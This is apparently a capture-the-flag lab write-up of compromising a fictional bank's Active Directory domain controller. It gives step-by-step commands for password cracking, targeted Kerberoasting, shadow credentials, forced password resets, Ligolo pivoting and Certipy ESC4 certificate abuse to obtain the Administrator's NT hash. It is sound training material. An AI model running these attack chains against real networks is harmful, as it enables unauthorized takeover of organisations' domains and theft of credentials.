# 404 Bank | Writeups

[![Logo](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fwww.hacksmarter.org%2Fapi%2Ffavicon.ico\&width=20\&dpr=3\&quality=100\&sign=6e985eb0\&sv=2)CourseStackwww.hacksmarter.orgchevron-right](https://www.hacksmarter.org/courses/bd8a0659-8afe-40b4-9e95-0fe932850773)

The following post by 0xb0b is licensed under [CC BY 4.0![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fmirrors.creativecommons.org%2Fpresskit%2Ficons%2Fcc.svg%3Fref%3Dchooser-v1\&width=40\&dpr=3\&quality=100\&sign=7f04aa2e\&sv=2)![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fmirrors.creativecommons.org%2Fpresskit%2Ficons%2Fby.svg%3Fref%3Dchooser-v1\&width=40\&dpr=3\&quality=100\&sign=c8892a07\&sv=2)arrow-up-right](http://creativecommons.org/licenses/by/4.0/?ref=chooser-v1)

***

### [hashtag](404-bank-or-writeups.md#scenario) Scenario

#### [hashtag](404-bank-or-writeups.md#user-content-objective--scope) Objective / Scope

404 Bank, a staple of the local financial community, is conducting its annual security assessment. To uphold their motto of being **"Proven, Local, Strong,"** the bank has commissioned the **Hack Smarter Red Team** to perform an internal penetration test.

#### [hashtag](404-bank-or-writeups.md#user-content-initial-access) Initial Access

You have been provided with VPN access to their internal environment, but no other information.

### [hashtag](404-bank-or-writeups.md#summary) Summary

chevron-rightSummary [hashtag](404-bank-or-writeups.md#summary-1)

In Bank 404 we begin only with VPN access and no other information. Enumeration of the website reveals a downloadable executable, `CorpBankDialer.exe`, containing a Base64-encoded MD5 hash that, once cracked, provides a valid password. Combining this with usernames generated from staff names found on the site, we authenticate as `karl.hackermann`. Using these credentials, we perform BloodHound enumeration and discover that `karl.hackermann` has `GenericWrite` permissions over `tom.reboot`. We escalate via Targeted Kerberoasting, extracting a TGS, and cracking it to recover `tom.reboot`’s password. From there, chained permissions allow `ForceChangePassword` over `robert.graef`, who in turn can `ForceChangePassword`over `jan.tresor` and other users. After adding `jan.tresor` to the Remote Desktop Users group and changing the users password, we gain RDP access and recover credentials for `daniel.hoffmann` from a deleted email.

As `daniel.hoffmann`, we pivot to the webadmin user by resetting its password, then access an internal port `5000` service via Ligolo tunneling. Downloading and cracking a password-protected configuration archive yields credentials for `svc.services`, initially disabled. Using `robert.graef`’s `WriteAccountRestrictions` privilege, we re-enable the account and authenticate successfully. With `svc.services` belonging to the Certificate Service DCOM Access group, we identify a vulnerable Vuln-ESC4 template and exploit it using Certipy by reconfiguring it to an ESC1-style template and requesting a certificate for Administrator. Authenticating with the generated certificate provides the NT hash of Administrator, enabling domain compromise and retrieval of the final flag from the Administrator’s desktop.

### [hashtag](404-bank-or-writeups.md#recon) Recon

We use rustscan `-b 500 -a 10.0.28.235 -- -sC -sV -Pn` to enumerate all TCP ports on the target machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

Copy

```
rustscan -b 500 -a 10.0.28.235 -- -sC -sV -Pn
```

![](<../../../.gitbook/assets/image (198)>)

The target machine is actually a domain controller with exposed services including DNS `53`, Kerberos `88/464`, an `IIS /10.0` web server on port `80`, multiple MSRPC endpoints `135, 593, 49664+`, SMB `139/445`, LDAP and LDAPS `389/636/3268/3269` tied to Active Directory, RDP `3389`, WinRM on `5985`, and .NET Remoting `9389`. This indicates a fully integrated Windows AD environment where LDAP/LDAPS and Kerberos provide authentication, SMB and RPC enable remote management, and RDP/WinRM serve as remote access points.

![](<../../../.gitbook/assets/image (5)>)

#### [hashtag](404-bank-or-writeups.md#web) WEB

We start our enumeration on the web server on port 80. We first visit the page with our browser and find a static site infront of us.

Copy

```
http://404finance.local/
```

![](<../../../.gitbook/assets/image (6)>)

As we scroll through the page, we also find a team of three people.

![](<../../../.gitbook/assets/image (201)>)

We note down the individual names of the team members so that we can generate usernames from them later for later use.

Copy

```
Alex Meier
Robert Graef
Karl Hackermann
```

On the Services page, we also find an executable file. We download this file.

Copy

```
http://404finance.local/services.html
```

![](<../../../.gitbook/assets/image (202)>)

Enumerating the directories using Feroxbuster did not yield any useful results.

Copy

```
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://404finance.local
```

![](<../../../.gitbook/assets/image (203)>)

#### [hashtag](404-bank-or-writeups.md#smb) SMB

Before we dive in with username enumeration we try to authenticate as `guest` and anonymously against SMB, but without success. Nevertheless we generate the hosts file entry like the following

Copy

```
nxc smb 10.0.28.235 -u '' -p '' --generate-hosts-file hosts
```

![](<../../../.gitbook/assets/image (204)>)

We add the following to our `/etc/hosts` file. We could also directly append the entry to our hosts file by providing the path to `/etc/hosts` in the NetExec command.

Copy

```
10.0.28.235     DC-404.404finance.local 404finance.local DC-404
```

### [hashtag](404-bank-or-writeups.md#access-as-karl.hackermann) Access as karl.hackermann

During preliminary analysis using strings of the downloaded `CorpBankDialer.exe`, we find a DEBUG string encoded in base64.

![](<../../../.gitbook/assets/image (205)>)

When we decode this, we get an MD5 hash. We then try to crack this. It could be a secret, or password me might need to use later.

![](<../../../.gitbook/assets/image (206)>)

We crack the MD5 hash using hashcat and, based on the result we get, we are clearly dealing with a password.

Copy

```
hashcat -a0 -m0 'REDACTED' /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (207)>)

We have a password and a set of names from the team. What we still need are usernames to test the password against SMB or other available networks.

[![Logo](<../../../.gitbook/assets/image (39)>)GitHub - urbanadventurer/username-anarchy: Username tools for penetration testingGitHubchevron-right](https://github.com/urbanadventurer/username-anarchy)

We generate these using username anarchy.

Copy

```
username-anarchy -i team.txt > usernames.txt
```

![](<../../../.gitbook/assets/image (209)>)

Next, we try every possible username from our username-anachry result with the password found from the executable. And in the end, we are successful; we can successfully authenticate with the password as `karl.hackermann`.

Copy

```
nxc smb 404finance.local -u usernames.txt -p 'REDACTED'
```

![](<../../../.gitbook/assets/image (210)>)

We don't see any special shares at first.

Copy

```
nxc smb 404finance.local -u karl.hackermann -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (211)>)

### [hashtag](404-bank-or-writeups.md#bloodhound-enumeration) BloodHound enumeration

With the credentials, we can now also enumerate the AD using BloodHound.

Copy

```
bloodhound-ce.py --zip -c All -d 404finance.local -u 'karl.hackermann' -p 'REDACTED' -dc DC-404.404finance.local -ns 10.0.28.235
```

![](<../../../.gitbook/assets/image (212)>)

We are able to identify `Administrator` as one of the Domain Admins.

![](<../../../.gitbook/assets/image (213)>)

As `karl.hackerman`, we have `GenericWrite` permission over `tom.reboot`. With this, we can either perform a targeted Kerberoast attack to obtain a crackable service ticket, or carry out a shadow credentials attack, which would allow us to authenticate as tom.reboot without knowing their password like we did in Arasaka:

[![Logo](<../../../.gitbook/assets/image (103)>)Arasaka | Writeups0xb0b.gitbook.iochevron-right](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025/arasaka#shadow-credentials-attack)

![](<../../../.gitbook/assets/image (215)>)

When we look at the shortest path from our owned object, we see that we can start from `karl.hackermann`, who has `GenericWrite` permissions over `tom.reboot`. This allows us to perform either a targeted Kerberoasting attack or a shadow credentials attack like mentioned before. Using this access, we can `ForceChangePassword` on `tom.reboot`, which in turn gives us control over `robert.graef`. From there, we can all compromised users to the Remote Management Users group.

Furthermore, as `robert.graef`, we can `ForceChangePassword` on `nina.inkasso`, `melanie.kunz`, and `jan.tresor`.

![](<../../../.gitbook/assets/image (216)>)

circle-info

If a more recent version of bloodhound-ce.py is used, it might be possible to see even more permissions that `robert.graef` has. These will be necessary for the subsequent privilege escalation. Even though we cannot see them here in the output, we can still use them. More on this when we get to that point. For now, we can continue as follows.

### [hashtag](404-bank-or-writeups.md#access-as-tom.reboot) Access as tom.reboot

From our Bloodhound analysis we know that `karl.hackermann` has a `GenericWrite` relationship to `tom.reboot`. This allows either a TargetedKerberoast or Shadow Credentials Atttack.

With the `GenericWrite` permission we are able to modify `tom.reboot'`s servicePrincipalName (SPN), we request a service ticket for it, and perform offline Kerberos ticket cracking to recover its password.

In a Shadow Credentials Attack we abuse the `GenericWrite` permission to add a malicious key credential to `tom.reboot`, allowing authentication as that account without knowing its password.

We will show both options.

#### [hashtag](404-bank-or-writeups.md#targetedkerberoast) TargetedKerberoast

We'll start with the TargetedKerberoast. See below links for further reading:

[![Logo](<../../../.gitbook/assets/image (33)>)Kerberoast | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#targeted-kerberoasting)

[![Logo](<../../../.gitbook/assets/image (33)>)Targeted Kerberoasting | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)

> This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over the target. A member of the [Account Operatorarrow-up-right](https://www.thehacker.recipes/ad/movement/builtins/security-groups) group usually has those permissions.
>
> The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoastingarrow-up-right](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.

To perform the TargetedKerberoast we will use the following tool:

[![Logo](<../../../.gitbook/assets/image (39)>)GitHub - ShutdownRepo/targetedKerberoast: Kerberoast with ACL abuse capabilitiesGitHubchevron-right](https://github.com/ShutdownRepo/targetedKerberoast)

We run the following command and are able to get the Kerberos 5, etype 23, TGS-REP blob of the `tom.reboot` user.

Copy

```
targetedKerberoast.py -d '404finance.local' -u 'karl.hackermann' -p 'REDACTED' --dc-ip 10.0.28.235
```

![](<../../../.gitbook/assets/image (218)>)

We use hashcat to crack the blob and are able to retrieve the password of `tom.reboot`.

Copy

```
hashcat -a0 -m13100 tom.reboot.blob /usr/share/wordlists/rockyou.txt --show
```

![](<../../../.gitbook/assets/image (219)>)

We test the credentials using NetExec. We successfully authenticated. We could now move on, or try the Shadow Credentials Attack.

Copy

```
nxc smb 404finance.local -u tom.reboot -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (220)>)

#### [hashtag](404-bank-or-writeups.md#shadow-credentials-attack) Shadow Credentials Attack

The following Section descirbes the Shadow Credentials Attack it's an alternative path to the TargetedKerberoast attack and can be skipped.

Further information on the Shadow Credentials Attack can be found under the following link:

[![Logo](<../../../.gitbook/assets/image (33)>)Shadow Credentials | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials)

To perform the Shadow Credentials Attack we are using Certipy.

[![Logo](<../../../.gitbook/assets/image (39)>)GitHub - ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuseGitHubchevron-right](https://github.com/ly4k/Certipy?tab=readme-ov-file#shadow-credentials)

In short: If we can write to the msDS-KeyCredentialLink property of a user, we can retrieve the NT hash of that user.

With the following command we issue the attack and are succesful. We retrieve the NT hash of `tom.reboot`.

Copy

```
certipy shadow auto -u 'karl.hackermann@404finance.local' -p 'REDACTED' -account 'tom.reboot' -dc-ip 10.1.57.15
```

![](<../../../.gitbook/assets/image (221)>)

We test the credentials using NetExec. We successfully authenticated. We could now move on.

Copy

```
nxc ldap 404finance.local -u tom.reboot -H 'REDACTED'
```

![](<../../../.gitbook/assets/image (222)>)

### [hashtag](404-bank-or-writeups.md#access-as-robert.graef) Access as robert.graef

From our Bloodhound analysis we know that `tom.reboot` has a `GenericWrite` relationship to `robert.graef`. This allows us to change the password of the user. The following resource showcases the different tools we could use to change the password of the user.

[![Logo](<../../../.gitbook/assets/image (33)>)ForceChangePassword | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword)

We will be using bloodyAD.

[![Logo](<../../../.gitbook/assets/image (39)>)GitHub - CravateRouge/bloodyAD: BloodyAD is an Active Directory Privilege Escalation FrameworkGitHubchevron-right](https://github.com/CravateRouge/bloodyAD)

Copy

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```

Next, with the following command we change the password for `robert.graef` to `Pwned123@!`.

Copy

```
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'tom.reboot' -p 'REDACTED' set password 'robert.graef' 'Pwned123@!'
```

![](<../../../.gitbook/assets/image (223)>)

We test the credentials using NetExec. We successfully authenticated. We move on.

Copy

```
nxc smb 404finance.local -u robert.graef -p 'Pwned123@!' --shares
```

![](<../../../.gitbook/assets/image (224)>)

### [hashtag](404-bank-or-writeups.md#rdp-session-with-jan.tresor) RDP session with jan.tresor

From `robert.graef`, we can `ForceChangePassword` on `nina.inkasso`, `melanie.kunz`, and `jan.tresor`. For now we will focus only on `jan.tresor` as thats the user having some valubale loot for us later.

[![Logo](<../../../.gitbook/assets/image (33)>)ForceChangePassword | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword)

With the following command we change the password for `jan.tresor` to `Pwned123@!`.

Copy

```
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'robert.graef' -p 'Pwned123@!' set password 'jan.tresor' 'Pwned123@!'
```

![](<../../../.gitbook/assets/image (225)>)

We test the credentials using NetExec. We successfully authenticated. We move on.

Copy

```
nxc smb 404finance.local -u jan.tresor -p 'Pwned123@!' --shares
```

![](<../../../.gitbook/assets/image (226)>)

However, the user `jan.tresor` is not in the `Remote Desktop Users` group. That doesn't matter, because as `robert.graef` we can add users to this group thanks to the `AddMember` permission. We did this for all users in order to check for each initial access whether there was anything to be gained. However, we only found something with `jan.tresor`. To add a member to the group `Remote Desktop Users` we use also bloodyAD.

[![Logo](<../../../.gitbook/assets/image (33)>)AddMember | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/addmember#addmember)

Copy

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
```

Copy

```
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'robert.graef' -p 'Pwned123@!' add groupMember 'remote desktop users' 'jan.tresor'
```

![](<../../../.gitbook/assets/image (227)>)

After we have added jan.tresor to the Remote Management Users we are able to RDP into the machine. On the Desktop we find a full recycle bin.

![](<../../../.gitbook/assets/image (228)>)

### [hashtag](404-bank-or-writeups.md#shell-as-daniel.hoffmann) Shell as daniel.hoffmann

In the recycle bin, we find some email copies (`.eml` files). One of them may contain something valuable.

![](<../../../.gitbook/assets/image (229)>)

The Mail `Access Credentials - Don't tell Anyone` stands out in particular. Maybe we'll get lucky. In it, we find the password for Daniel Hoffmann.

![](<../../../.gitbook/assets/image (230)>)

We test the credentials using NetExec. We successfully authenticated. We move on.

Copy

```
nxc smb 404finance.local -u daniel.hoffmann -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (231)>)

The user daniel.hoffmann is in the remote management user group, which would allow us to use evil-winrm for a session. We are testing this.

![](<../../../.gitbook/assets/image (232)>)

We connect to the target machine as daniel.hoffmann using evil-winrm and find the user flag at `C:\Users\daniel.hoffmann\Desktop\user.txt`.

Copy

```
evil-winrm -i DC-404.404finance.local -u daniel.hoffmann -p 'REDACTED'
```

![](<../../../.gitbook/assets/image (233)>)

### [hashtag](404-bank-or-writeups.md#access-as-webadmin) Access as webadmin

We check our BloodHound data again to see if we can do more with `daniel.hoffmann` and see that he also has `ForceChangePassword` permissions. This is for the user webadmin.

![](<../../../.gitbook/assets/image (234)>)

However, it seems that we cannot proceed any further from webadmin. This could be a dead end or a clue. We have not enumerated further on the server yet. It is possible that an internal web server is running on it, from which we could proceed further.

![](<../../../.gitbook/assets/image (235)>)

We look at which ports are being listened to and find port 5000.

![](<../../../.gitbook/assets/image (236)>)

We try to request it in the session using the curl alias, but we have to authenticate ourselves. We make the internal ports available to our attacker machine using Ligolo, but we could also do this on a smaller scale with Chisel.

![](<../../../.gitbook/assets/image (237)>)

[**hashtag**](404-bank-or-writeups.md#ligolo-ng-setup) **Ligolo-ng setup**

We will be using the latest release `v0.8.2`:

[![Logo](<../../../.gitbook/assets/image (39)>)GitHub - nicocha30/ligolo-ng: An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.GitHubchevron-right](https://github.com/nicocha30/ligolo-ng)

First, we run a proxy.

Copy

```
sudo ./proxy -selfcert
```

![](<../../../.gitbook/assets/image (238)>)

Inside that proxy we create an interface called `bank`.

Copy

```
ifcreate --name bank
```

Next, we add a single route to the interface to reach the internal services of the host.

Copy

```
route_add --name bank --route 240.0.0.1/32
```

![](<../../../.gitbook/assets/image (239)>)

Copy

```
./agent.exe -connect 10.200.33.13:11601 --ignore-cert
```

![](<../../../.gitbook/assets/image (240)>)

After the connection has been made we should see in our proxy that an agent has joined.

![](<../../../.gitbook/assets/image (241)>)

We can list and interact with the session by calling `session` and then chosing the session. The following screenshot illustrates the steps taken.

Copy

```
session
```

After chosing the session, we can start the tunnel.

Copy

```
tunnel_start --tun bank
```

To confirum our tunnel and routes we can issue the following commands:

Copy

```
tunnel_list
```

Copy

```
route_list
```

![](<../../../.gitbook/assets/image (242)>)

We can now reach the internal web service running on port 5000 via `http://240.0.0.1:5000`. This requires basic authentication.

![](<../../../.gitbook/assets/image (243)>)

We'll try using the `webadmin`. But first we need a password for it. We'll change the password as usual using bloodyAD.

Copy

```
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'daniel.hoffmann' -p 'REDACTED' set password 'webadmin' 'Pwned123@!'
```

![](<../../../.gitbook/assets/image (244)>)

### [hashtag](404-bank-or-writeups.md#access-as-svc.services) Access as svc.services

Next, we enter our set credentials...

Copy

```
http://240.0.0.1:5000/
```

![](<../../../.gitbook/assets/image (245)>)

... and are able to login. We can download service `config_backup.zip` file.

![](<../../../.gitbook/assets/image (246)>)

The zip file is password protected. Using zip2john, we generate a hash that we then attempt to crack.

Copy

```
zip2john config_backup.zip > config_backup.zip.hash
```

![](<../../../.gitbook/assets/image (247)>)

However, our `rockyou.txt` does not seem to contain the password.

Copy

```
john --wordlist=/usr/share/wordlists/rockyou.txt config_backup.zip.hash
```

![](<../../../.gitbook/assets/image (248)>)

We are trying to generate a word listfrom the keywords on the website. We extract these using cewl.

Copy

```
cewl --depth 10 --with-numbers --write cewl.txt http://404finance.local/history.html
```

![](<../../../.gitbook/assets/image (249)>)

Using our generated word list, we were able to successfully crack the password of the zip file and unzip its contents.

Copy

```
john --wordlist=./cewl.txt config_backup.zip.hash
```

![](<../../../.gitbook/assets/image (250)>)

The zip file contains a `config.dat` file that contains the credentials for the user account `svc.services`.

![](<../../../.gitbook/assets/image (251)>)

We test the credentials using NetExec but the account is disabled.

Copy

```
nxc smb 404finance.local -u 'svc.services' -p 'REDACTED'
```

![](<../../../.gitbook/assets/image (252)>)

circle-info

Here is the crucial part that I missed in my initial enumeration. My version of bloodhound-ce.py does not seem to capture all relationships between the object completely.

In addition to `ForceChangePassword`, `robert.graef` has other permissions, including `WriteAccountRestrictions` on svc.service. This allows us to re-enable the svc.services account.

What `WriteAccountRestrictions` allows:

It lets you modify attributes that control logon behavior, including:

* `userAccountControl`
* Logon hours
* Workstation restrictions

And `ACCOUNTDISABLE` is just a bit inside `userAccountControl`

I received this tip from Schlop, who also introduced me to the GriffonAD tool, which is similar to a text-based version of Bloodhound. I think it's a very cool tool that provides a good overview in small environments.

He also showed me his version, which he forked to implement additional features such as reading the entire zip file from a BloodhHound enumeration.

[https://github.com/schlopshow/GriffonADarrow-up-right](https://github.com/schlopshow/GriffonAD)

We enable the account like the following using bloodyAD.

[![Logo](<../../../.gitbook/assets/image (39)>)User GuideGitHubchevron-right](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide#remove-uac)

Copy

```
bloodyAD --host DC-404.404finance.local -d 404finance.local -u robert.graef -p 'Pwned123@!' remove uac svc.services -f ACCOUNTDISABLE
```

![](<../../../.gitbook/assets/image (253)>)

We test the credentials using NetExec again and this time we can successfully authenticate.

Copy

```
nxc smb 404finance.local -u 'svc.services' -p 'REDACTED'
```

![](<../../../.gitbook/assets/image (254)>)

### [hashtag](404-bank-or-writeups.md#shell-as-administrator) Shell as Administrator

The svc.services account is member of the Certificates Service DCOM Access group.

![](<../../../.gitbook/assets/image (255)>)

We check if we can find any misconfigured certificate templates to escalate our privileges. We find one. The template Vuln-ESC4 is vulnerable to ESC4. ESC4 means we have write permissions on that certificate template, so we can modify it (for example, add dangerous EKUs or enable user-supplied SANs) and turn it into an ESC1-style vulnerable template

Copy

```
certipy find -u svc.services@404finance.local -p 'REDACTED' -dc-ip 404finance.local -vulnerable
```

![](<../../../.gitbook/assets/image (256)>)

20260204000836\_Certipy.json

Copy

```
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "404finance-DC-404-CA",
      "DNS Name": "DC-404.404finance.local",
      "Certificate Subject": "CN=404finance-DC-404-CA, DC=404finance, DC=local",
      "Certificate Serial Number": "49F9F3F512FE1BA84F59D5DAAD071218",
      "Certificate Validity Start": "2025-07-03 13:33:46+00:00",
      "Certificate Validity End": "2030-07-03 13:43:46+00:00",
      "Web Enrollment": "Disabled",
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Permissions": {
        "Owner": "404FINANCE.LOCAL\\Administrators",
        "Access Rights": {
          "2": [\
            "404FINANCE.LOCAL\\Administrators",\
            "404FINANCE.LOCAL\\Domain Admins",\
            "404FINANCE.LOCAL\\Enterprise Admins"\
          ],
          "1": [\
            "404FINANCE.LOCAL\\Administrators",\
            "404FINANCE.LOCAL\\Domain Admins",\
            "404FINANCE.LOCAL\\Enterprise Admins"\
          ],
          "512": [\
            "404FINANCE.LOCAL\\Authenticated Users"\
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "Vuln-ESC4",
      "Display Name": "Vuln-ESC4",
      "Certificate Authorities": [\
        "404finance-DC-404-CA"\
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [\
        "EnrolleeSuppliesSubject"\
      ],
      "Enrollment Flag": [\
        "PublishToDs",\
        "PendAllRequests",\
        "IncludeSymmetricAlgorithms"\
      ],
      "Private Key Flag": [\
        "ExportableKey"\
      ],
      "Extended Key Usage": [\
        "Client Authentication",\
        "KDC Authentication",\
        "Server Authentication",\
        "Smart Card Logon"\
      ],
      "Requires Manager Approval": true,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 1,
      "Validity Period": "99 years",
      "Renewal Period": "650430 hours",
      "Minimum RSA Key Length": 2048,
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [\
            "404FINANCE.LOCAL\\Service Account"\
          ]
        },
        "Object Control Permissions": {
          "Owner": "404FINANCE.LOCAL\\Enterprise Admins",
          "Full Control Principals": [\
            "404FINANCE.LOCAL\\Domain Admins",\
            "404FINANCE.LOCAL\\Local System",\
            "404FINANCE.LOCAL\\Enterprise Admins"\
          ],
          "Write Owner Principals": [\
            "404FINANCE.LOCAL\\Service Account",\
            "404FINANCE.LOCAL\\Domain Admins",\
            "404FINANCE.LOCAL\\Local System",\
            "404FINANCE.LOCAL\\Enterprise Admins"\
          ],
          "Write Dacl Principals": [\
            "404FINANCE.LOCAL\\Service Account",\
            "404FINANCE.LOCAL\\Domain Admins",\
            "404FINANCE.LOCAL\\Local System",\
            "404FINANCE.LOCAL\\Enterprise Admins"\
          ],
          "Write Property Principals": [\
            "404FINANCE.LOCAL\\Service Account",\
            "404FINANCE.LOCAL\\Domain Admins",\
            "404FINANCE.LOCAL\\Local System",\
            "404FINANCE.LOCAL\\Enterprise Admins"\
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC4": "'404FINANCE.LOCAL\\\\Service Account' has dangerous permissions"
      }
    }
  }
}#
```

chevron-downShow all 107 lines

Template name:

Copy

```
Vuln-ESC4
```

![](<../../../.gitbook/assets/image (257)>)

We can follow the guide of certipys wiki if we are using the current version 5.0.2:

[![Logo](<../../../.gitbook/assets/image (39)>)06 ‐ Privilege EscalationGitHubchevron-right](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking)

> **Step 1: Modify the template to a vulnerable state.** Certipy's `template` command with the `-write-default-configuration` option is a convenient way to automatically reconfigure a target template to a known ESC1-like vulnerable state. This option typically:
>
> * Enables "Enrollee Supplies Subject" (`msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT`).
> * Adds the "Client Authentication" EKU (`pKIExtendedKeyUsage` and `msPKI-Certificate-Application-Policy`).
> * Grants "Full Control" (which includes enrollment rights) on the template to the "Authenticated Users" group (by modifying `nTSecurityDescriptor`).
> * Disables manager approval (`msPKI-Enrollment-Flag` adjusted, `PendAllRequests` removed).
> * Sets "Authorized Signatures Required" to 0 (`msPKI-RA-Signature = 0`).
> * Clears any existing RA Application Policies (`msPKI-RA-Application-Policies`). This command also automatically saves the template's original configuration to a JSON file before applying changes.

But in my case I m using the old version of certipy.

Copy

```
certipy template \
    -u 'svc.services@404finance.local' -p 'REDACTED' \
    -dc-ip '10.1.9.196' -template 'Vuln-ESC4' \
    -write-default-configuration
```

![](<../../../.gitbook/assets/image (258)>)

For a reference I suggest the following resource on how to exploit ESC4 with certipy 4.8.2:

[![Logo](<../../../.gitbook/assets/image (259)>)ADCS Attacks with Certipyseriotonchevron-right](https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/index.html)

We modify the certificate template...

Copy

```
certipy template -u 'svc.services@404finance.local' -p 'REDACTED' -dc-ip '10.1.9.196' -template 'Vuln-ESC4' -save-old
```

![](<../../../.gitbook/assets/image (260)>)

... and afterwards request a certificate that impersonates the Administrator account to obtain an authentication certificate for `administrator@404finance.local`.

> **Step 2: Request a certificate using the modified template.** The attacker now requests a certificate for a privileged user (e.g., Administrator), leveraging the ESC1 vulnerability they just created in the "SecureFiles" template.

Copy

```
certipy req -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' -dc-ip '10.1.9.196' -ca 404finance-DC-404-CA -template 'Vuln-ESC4' -upn 'administrator@404finance.local'
```

![](<../../../.gitbook/assets/image (261)>)

Next we authenticate using the the obtained certificate. We are able to retrieve the NT hash of the `administrator` accoiunt.

> **Step 3: Authenticate using the obtained certificate.**

Copy

```
certipy auth -pfx 'administrator.pfx' -dc-ip '10.1.9.196'
```

![](<../../../.gitbook/assets/image (262)>)

We use the hash to authenticate as Administrator via Evil-WinRM, and retrieve the final flag at `C:\Users\Administrator\Desktop\root.txt`.

Copy

```
evil-winrm -i DC-404.404finance.local -u Administrator -H 'REDACTED'
```

![](<../../../.gitbook/assets/image (263)>)

[PreviousGitOopschevron-left](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2026/gitoops) [NextRace Conditionschevron-right](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2026/race-conditions)

Last updated 2 months ago

Was this helpful?

This site uses cookies to deliver its service and to analyze traffic. By browsing this site, you accept the [privacy policy](https://policies.gitbook.com/privacy/cookies).

close

AcceptReject
